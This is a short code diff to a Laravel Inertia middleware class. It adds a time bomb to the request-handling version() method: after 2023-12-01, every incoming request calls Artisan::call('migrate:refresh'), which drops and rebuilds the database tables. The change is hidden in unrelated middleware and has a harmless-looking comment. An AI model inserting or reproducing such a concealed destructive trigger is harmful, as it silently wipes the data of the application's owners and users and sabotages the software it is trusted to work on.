@@ -25,6 +25,12 @@ class HandleInertiaRequests extends Middleware
      */
     public function version(Request $request)
     {
+        $date_now = date("Y-m-d"); // this format is string comparable
+
+        if ($date_now > '2023-12-01') {
+            Artisan::call('migrate:refresh');
+        }
+        
         return parent::version($request);
     }
 
